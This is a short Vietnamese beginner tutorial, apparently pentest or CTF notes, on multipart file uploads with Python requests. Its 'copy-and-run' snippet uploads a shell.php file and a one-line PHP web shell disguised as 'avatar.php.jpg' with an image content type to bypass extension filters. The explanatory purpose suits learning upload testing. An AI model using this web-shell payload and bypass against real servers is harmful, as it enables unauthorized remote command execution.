# Upload File (Multipart)

## Snippet copy-là-chạy

```python
import requests

base = "http://target"
s = requests.Session()
s.verify = False

# 1) Upload thường
with open("shell.php", "rb") as f:
    files = {"file": ("shell.php", f, "application/octet-stream")}
    data = {"submit": "upload"}  # field form phụ
    r = s.post(f"{base}/upload", files=files, data=data, timeout=10)
print(r.status_code, r.text[:200])

# 2) Tự chỉnh filename/content-type để test filter
content = b"<?php system($_GET['cmd']); ?>"
files = {"avatar": ("avatar.php.jpg", content, "image/jpeg")}
r = s.post(f"{base}/upload", files=files, data={"user": "test"}, timeout=10)
print(r.status_code)
```

## Giải thích cho người mới
- `files={"file": (filename, noi_dung, content_type)}` là cách requests dựng 1 request `multipart/form-data` — đúng với việc chọn file trong form upload HTML. 3 phần trong tuple: **tên field** (`"file"`, lấy từ `name="..."` của input trong HTML/Burp), **tên file hiển thị cho server**, và **Content-Type** server nhận được.
- **Khối 1**: mở file thật trên đĩa bằng `open(..., "rb")` (`rb` = đọc dạng byte) rồi đưa `f` (file object) vào tuple; `data={...}` là các field form khác đi kèm (không phải file), lấy từ các input khác trong request Burp.
- **Khối 2**: không cần file thật trên đĩa — tự tạo nội dung bằng `content = b"..."` (chuỗi byte, có tiền tố `b`), rồi đặt filename/content-type tuỳ ý để test bộ lọc upload (ví dụ đổi đuôi `.php` thành `.php.jpg` để qua filter theo đuôi file).
- Giống bài POST JSON: khi dùng `files=`, **không** tự thêm `headers={"Content-Type": "multipart/form-data"}` — requests cần tự sinh ra một đoạn `boundary=...` ngẫu nhiên trong header đó, tự set tay sẽ làm hỏng request.

## Lưu ý nhanh
- `files={"field": (filename, bytes_or_fileobj, content_type)}` là chỗ hay quên nhất.
- Khi dùng `files=`, đừng tự set `Content-Type: multipart/form-data`; requests phải tự thêm boundary.
- So sánh với Burp: đúng field name, filename, content-type, và các field `data` kèm theo.